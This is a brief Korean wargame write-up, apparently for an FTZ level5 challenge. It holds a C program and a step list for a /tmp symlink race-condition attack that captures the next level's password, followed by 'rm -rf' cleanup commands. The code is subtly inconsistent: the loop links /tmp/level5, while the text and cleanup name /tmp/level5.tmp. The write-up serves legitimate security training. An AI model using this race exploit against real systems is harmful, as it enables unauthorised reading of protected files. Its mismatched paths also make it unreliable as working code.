#include <stdio.h>
#include <unistd.h>

int main()
{
    int i;
    system("touch /tmp/pass.txt");

    for (i=0;i<100;i++)
    {
        system("ln -s /tmp/pass.txt /tmp/level5");
    }
        system("cat /tmp/pass.txt");
        system("rm -rf /tmp/level5.tmp");
        system("rm -rf /tmp/pass.txt");

}

4. 레이스 컨디션 공격 (level5-2.c)

프로그램 실행
    'pass.txt' 파일 생성(touch /tmp/pass.txt)
    'level5.tmp' 링크 파일 생성(ln -s /tmp/pass.txt /tmp/level5.tmp)
     Level5-1에서 Level6 패스워드 정보가 level5.tmp 파일로 추가되어
    'pass.txt'링크 파일에서 확인이 가능하다.
--------------------------------------------------------------------
    'pass.txt' 파일 내용 확인(cat /tmp/pass.txt)
    'tmp/level5.tmp' 파일 삭제(rm -rf /tmp/level5.tmp)
    '/tmp/pass.txt' 파일 삭제(rm -rf /tmp/pass.txt)
--------------------------------------------------------------------
프로그램 종료
